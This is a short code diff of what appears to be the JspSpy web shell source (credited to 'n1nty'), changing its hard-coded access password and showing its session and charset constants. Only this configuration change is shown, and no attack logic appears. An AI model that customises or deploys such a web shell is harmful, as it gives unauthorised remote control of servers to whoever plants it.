@@ -20,7 +20,7 @@
 * by n1nty
 * CY . I Love You.
 */
-private static final String PW = "zxczxc"; //password
+private static final String PW = "cmddx"; //password
 private static final String PW_SESSION_ATTRIBUTE = "JspSpyPwd";
 private static final String REQUEST_CHARSET = "ISO-8859-1";
 private static final String PAGE_CHARSET = "UTF-8";
